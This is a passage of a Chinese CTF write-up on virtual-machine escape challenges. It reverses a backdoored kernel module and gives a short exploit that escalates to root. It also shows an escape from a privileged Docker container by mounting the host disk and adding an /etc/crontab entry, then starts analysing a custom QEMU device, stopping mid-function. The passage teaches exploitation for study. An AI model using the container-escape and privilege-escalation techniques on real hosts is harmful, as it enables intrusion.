## 前言
去年的数字经济共测大赛让我接触到了虚拟机逃逸，当时对此一窍不通最后罚坐了两天，之后一直惦记着之前没做出来的题，一直到今天终于完成了最后一个VMWare逃逸，总算是把所有的坑都给填了。4道题目里浏览器的题目[P1umer师傅-数字经济线下 Realworld Browser writeup](https://xz.aliyun.com/t/6577)和[e3pem师傅-数字经济线下-Browser](https://e3pem.github.io/2019/11/20/browser/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Browser/)已经给出题解，剩余的三道题从漏洞层面来说非常简单，这里就作为一个基础实践分享给对虚拟机逃逸有兴趣的朋友。
另外逃逸题目的环境都是虚拟机，这里给出docker逃逸和qemu逃逸的附件以及VMware的patch文件及WorkStation的版本[链接](https://github.com/xmzyshypnc/xz_files/tree/master/EscapeAll)
## docker逃逸
### 程序逻辑
题目给了一个虚拟机，内核版本为4.15.0-54-generic，给了一个有漏洞的内核模块de.ko，漏洞主要存在其中，初始化在bss上的hack上分配了一个堆，并用`*(_BYTE
*)(hack1 + 8) = 1;`置1，之后给了cred的size大小。
    __int64 __fastcall init_module(__int64 a1, __int64 a2)
    {
      __int64 v2; // rdi
      __int64 hack1; // rax
      _fentry__(a1, a2);
      v2 = kmalloc_caches[4];
      *(&note + 0x100000000LL) = 0;
      hack1 = kmem_cache_alloc_trace(v2, 0x14000C0LL, 10LL);
      *(_BYTE *)(hack1 + 8) = 1;
      hack = hack1;
      proc_create_data("de", 0x1B6LL, 0LL, &de_proc, 0LL);
      printk("/proc/de created\n", 0x1B6LL);
      printk("size of cred : %ld \n", 0xA8LL);
      return 0LL;
    }
read函数将`*((_QWORD *)&note + 1)`的指针的内容拷贝给用户，实际上后面可以看到在这里会分配内存
    unsigned __int64 __fastcall de_read(__int64 a1, __int64 user_buf)
    {
      unsigned __int64 v2; // rdx
      unsigned __int64 v3; // r12
      unsigned __int64 v4; // rbx
      __int64 v5; // r12
      _fentry__(a1, user_buf);
      v3 = v2;
      mutex_lock(&lock);
      printk("/proc/de read\n", user_buf);
      v4 = (unsigned __int8)note;
      if ( (unsigned __int8)note > v3 )
        v4 = v3;
      v5 = *((_QWORD *)&note + 1);
      _check_object_size(*((_QWORD *)&note + 1), v4, 1LL);
      copy_to_user(user_buf, v5, v4);
      mutex_unlock(&lock);
      return v4;
    }
write函数是我们分析的重点，程序根据我们发送的字符串的第一个字节进行switch case，-1则将用户输入拷贝到 _（
&note+1），-2则将用户输入拷贝到hack(此时可以覆盖hack+8地址处的值)，不为-3或者_(hack+8)==1会给 _(
&note+1)处分配一块指定大小的内存，否则(choice==-3且_(hack+8)==0)执行后门代码，弹计算器，如果choice==0则释放*(&note+1)，因此最后只要满足后门条件即可
    __int64 __fastcall de_write(__int64 a1, char *from)
    {
      char *from_1; // rbx
      __int64 size; // rdx
      __int64 write_size; // r12
      __int64 v5; // rsi
      char v6; // al
      __int64 chunk_addr; // rax
      __int64 v8; // rsi
      __int64 v10; // rax
      unsigned int v11; // eax
      __int64 v12; // r13
      __int64 v13; // r13
      const char *v14; // [rsp-40h] [rbp-40h]
      __int64 v15; // [rsp-38h] [rbp-38h]
      unsigned __int64 v16; // [rsp-30h] [rbp-30h]
      _fentry__(a1, from);
      from_1 = from;
      write_size = size;
      v16 = __readgsqword(0x28u);
      mutex_lock(&lock);
      v5 = (unsigned __int8)*from;
      printk("order:%d", v5);
      v6 = *from_1;
      if ( *from_1 )
      {
        if ( v6 == 0xFFu )                          // write note
        {
          printk("note write\n", v5);
          v13 = *((_QWORD *)&note + 1);
          _check_object_size(*((_QWORD *)&note + 1), write_size - 1, 0LL);// check(dst,count,false)
          copy_from_user(v13, from_1 + 1, write_size - 1);
          printk("write contents compelete\n", from_1 + 1);
        }
        else if ( v6 == 0xFEu )                     // write hack
        {
          printk("note write magic %ld\n", write_size);
          v12 = hack;
          _check_object_size(hack, write_size - 1, 0LL);
          copy_from_user(v12, from_1 + 1, write_size - 1);
        }
        else if ( v6 != 0xFDu || *(_BYTE *)(hack + 8) )
        {
          printk("note malloc\n", v5);
          note = *from_1;
          printk("write size compelete\n", v5);
          chunk_addr = _kmalloc((unsigned __int8)note, 0x14000C0LL);// kmalloc(size,flags)
          v8 = (unsigned __int8)note;
          *((_QWORD *)&note + 1) = chunk_addr;
          printk("malloc size compelete:%d @ %p\n", v8);// leak heap addr
        }
        else
        {
          v10 = prepare_kernel_cred(0LL);           // 0xfd
          commit_creds(v10);
          v14 = "/usr/bin/gnome-calculator";
          v15 = 0LL;
          v11 = call_usermodehelper("/usr/bin/gnome-calculator", &v14, envp_26376, 1LL);
          printk("RC is: %i \n", v11);
        }
      }
      else
      {
        printk("note free\n", v5);
        kfree(*((_QWORD *)&note + 1));              // double free
      }
      mutex_unlock(&lock);
      return write_size;
    }
### 漏洞利用
先用一次写清空hack+8的值，之后choice=0xfd调用后门弹计算器
### exp.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main()
    {
        int fd = open("/proc/de",2);
        char *user_buf = (char*)malloc(0x10*sizeof(char));
        user_buf[0] = '\xfe';
        write(fd,user_buf,0x10);
        user_buf[0] = '\xfd';
        write(fd,user_buf,0x1);
        return 0;
    }
### 调试
进入虚拟机，加载漏洞内核模块，启动docker
    sudo insmod /home/b/de.ko
    sudo docker run -itd --privileged -p 0.0.0.0:23:22 d77241e92fe6 /bin/bash -c "/etc/init.d/ssh start;/bin/bash"
传输漏洞文件
    scp -P23 ./exp* root@localhost
执行exp，成功
调试docker好像没有直接的方法，我这里是在宿主系统里找到内核文件(/boot/vmlinuz-4.15.0-54-generic)，拷贝到我的另一台虚拟机上，使用qemu进行调试。
调试脚本如下：
    #! /bin/sh
    qemu-system-x86_64 \
    -m 256M \
    -kernel ./vmlinuz-4.15.0-54-generic \
    -initrd  ./initramfs.img \
    -append "noexec rdinit=./linuxrc" \
    -gdb tcp::1234
想要vmlinux的话可以用github的extract脚本提取，这里用不到，启动qemu之后要先查找各种地址
    cat /proc/kallsyms | grep de_write
    cat /proc/kallsyms | grep hack
    cat /sys/module/de/sections/.text
之后启动gdb，`set arch i386:x86-64:intel`设置模拟的架构，`target remote
localhost:1234`调试内核，`add-symbol-file ./de.ko 0xffffffffc03b0000`添加符号表，
刚才我们查找到的hack地址为0xffffffffc03b2500，我们断点下在de_write，continue，在qemu里执行exp，可以看到已经能从gdb断住了，*(hack+8)为1
我们再continue一下，第一次的覆写完成，成功改为0
在0x118处下个断点(commit_creds)，成功执行到这里，说明exp执行成功
### 非预期解
看到知世师傅[知世](https://nightrainy.github.io/2019/10/31/play-with-docker/)的博客，学到了新的姿势。
docker开启–privileged的情况下其实docker的root跟外部物理机的root权限已经差不多了，我们可以通过mount挂载宿主机的磁盘到内部，进而修改/etc/crontab通过定时任务弹计算器，注意要设置环境变量display=0，注意user要是b(普通用户)，display=0的原因可以参见下文[display=0](https://unix.stackexchange.com/questions/193827/what-is-display-0)，因此只需要在/etc/crontab中加一行
    * * * * * b DISPLAY=:0 /usr/bin/gnome-calculator
即可每分钟弹一次计算器
## qemu逃逸
### 程序分析
这题需要一些qemu的基础知识，因为`ray-cp`师傅写的非常详细，传送门：[qemu pwn-基础知识](https://xz.aliyun.com/t/6562)，我就不再赘述了。另外可以先做下[qemu pwn-Blizzard CTF 2017
Strng writeup](https://xz.aliyun.com/t/6618)这道题，很有帮助。
下面一步步开始分析。
看启动方式可以猜到是`rfid`这个指定的设备有问题。
    #! /bin/sh
    ./qemu-system-x86_64 \
    -initrd ./initramfs.cpio \
    -kernel ./vmlinuz-4.8.0-52-generic \
    -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
    -monitor /dev/null \
    -m 64M --nographic \
    -L pc-bios \
    -device rfid,id=vda \
首先没有符号表，我们搜下`rfid`的字符串,根据之前的分析可以知道入口函数`rfid_class_init`里会有字符串`rfid_class_init`，所以根据引用可以找到`rfid_class_init`，里面那一堆是各种`id`，这个不必要再做区分，等会qemu里直接看设备基本就能对应上(或者找一个有符号表的qemu题按照偏移对照一下)
    __int64 __fastcall rfid_class_init(__int64 a1)
    {
      __int64 result; // rax
      result = sub_70031D(a1, "pci-device", "/home/wang/qemu/hw/misc/myrfid.c", 0x171LL, "rfid_class_init");
      *(_QWORD *)(result + 176) = pci_rfid_realize;
      *(_QWORD *)(result + 184) = 0LL;
      *(_WORD *)(result + 208) = 0x420;
      *(_WORD *)(result + 210) = 0x1337;
      *(_BYTE *)(result + 212) = 0x69;
      *(_WORD *)(result + 214) = 0xFF;
      return result;
    }
在class_init里，一定要给个`realize`函数，所以这里唯一一个函数指针可以推断出是`pci_rfid_realize`
    unsigned __int64 __fastcall pci_rfid_realize(__int64 pdev, __int64 errp)
    {
      unsigned __int64 v3; // [rsp+38h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      sub_570742(*(_QWORD *)(pdev + 120), 1LL);
      if ( !(unsigned int)sub_5C950D(pdev, 0LL, 1LL, 1LL, 0LL, errp) )
      {
        sub_570635(pdev + 2688, 1LL, sub_570A2E, pdev);
        sub_843CE1(pdev + 2520);
        sub_843FBD(pdev + 2576);
        sub_8449B4(pdev + 2512, "rfid", what, pdev, 0LL);
        sub_31B892(pdev + 2272, pdev, rfid_mmio_ops, pdev, "rfid-mmio", &off_1000000);
        sub_5C1EF2((_QWORD *)pdev, 0, 0, pdev + 2272);
      }
      return __readfsqword(0x28u) ^ v3;
    }
这时候再找个以前做过的qemu题，看看里面函数的参数，可以发现`sub_31B892`这个函数有6个参数且有字符串`rfid-mmio`，这就很显然这个函数是`memory_region_init_io`，而里面的第三个参数就是`rfid_mmio_ops`了。点进去看下，第一个函数指针是`rfid_mmio_read`，第二个是`rfid_mmio_write`。如此一来就找到了关键的`read/write`函数。
    .data.rel.ro:0000000000FE9720 rfid_mmio_ops   dq offset rfid_mmio_read
    .data.rel.ro:0000000000FE9720                                         ; DATA XREF: pci_rfid_realize+111↑o
    .data.rel.ro:0000000000FE9728                 dq offset rfid_mmio_write
先看`rfid_mmio_read`，第二个参数为我们输入的地址，判断`((addr >> 20) & 0xF) !=
15`，后面比较两个字符串，后者为`wwssadadBABA`，前者根据引用发现赋值来自`rfid_mmio_write`，比较成功之后执行`command`，看引用也来自`rfid_mmio_write`，下面分析write函数。
    signed __int64 __fastcall rfid_mmio_read(__int64 a1, unsigned __int64 addr)
    {
      size_t v2; // rax
      if ( ((addr >> 20) & 0xF) != 15 )
      {
        v2 = strlen(off_10CC100);
        if ( !memcmp(input, off_10CC100, v2) )
          system(command);
      }
      return 270438LL;
    }
`rfid_mmio_write`函数的逻辑实际上就是个小菜单，`(addr >> 20) & 0xF`作为`result`。  
如果`result`为`[0,5]`，就给`input[idx]`赋不同的固定值，`idx`为`(addr >> 16) &
0xF`;如果`result`为`6`，就往`command`里拷贝数据，`src`为`&n[4]`，而在程序开始我们`*(_QWORD *)&n[4] =
value;`将value赋值给了它，因此这里的`memcpy`实际上等同于`command[(unsigned __int16)arg11] =
value`。
    _BYTE *__fastcall rfid_mmio_write(__int64 a1, unsigned __int64 addr, __int64 value, unsigned int size)
    {
      _BYTE *result; // rax
      char n[12]; // [rsp+4h] [rbp-3Ch]
      unsigned __int64 arg11; // [rsp+10h] [rbp-30h]
      __int64 v7; // [rsp+18h] [rbp-28h]
      int v8; // [rsp+2Ch] [rbp-14h]
      int idx; // [rsp+30h] [rbp-10h]
      int v10; // [rsp+34h] [rbp-Ch]
      __int64 v11; // [rsp+38h] [rbp-8h]
      v7 = a1;